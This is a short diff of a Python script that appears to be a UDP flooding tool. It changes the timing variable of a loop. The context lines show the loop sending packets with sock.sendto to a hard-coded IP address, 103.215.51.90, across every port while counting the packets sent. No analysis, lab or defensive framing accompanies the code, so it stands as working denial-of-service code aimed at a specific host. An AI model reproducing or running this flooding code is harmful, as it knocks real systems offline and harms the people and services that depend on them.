@@ -67,7 +67,8 @@ print('\033[1;36m/ac Great Groundwork')
 time.sleep(1)
 
 sent = 0
-timeR = 600 + random.randint(0,20)
+i = 600
+timeR = i + random.randint(0,20)
 
 if port_mode == False:  # All ports.
     try:
@@ -85,7 +86,7 @@ if port_mode == False:  # All ports.
             sock.sendto(bytes, (str("103.215.51.90"), port))
             sent += 1
             port += 1
-            timeR = 10 + random.randint(0,20)
+            timeR = i + random.randint(0,20)
             
     except:
         print('\n\033[31;1mExited\033[0m')
